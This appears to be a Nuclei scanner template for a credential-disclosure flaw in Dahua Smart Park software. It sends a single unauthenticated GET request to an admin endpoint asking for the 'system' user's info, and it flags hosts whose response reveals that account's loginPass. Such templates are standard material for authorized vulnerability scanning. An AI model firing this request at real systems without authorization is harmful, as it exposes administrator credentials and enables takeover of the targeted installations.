id: dahua-loginpass-leak

info:
  name: dahua-loginpass-leak
  author: user
  severity: high
  description: 大华智慧园区任意密码读取攻击
  reference:
    - 
  tags: dahua

requests:
  - method: GET
    path: 
      - "{{BaseURL}}/admin/user_getUserInfoByUserName.action?userName=system"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"loginName":"system","loginPass"'
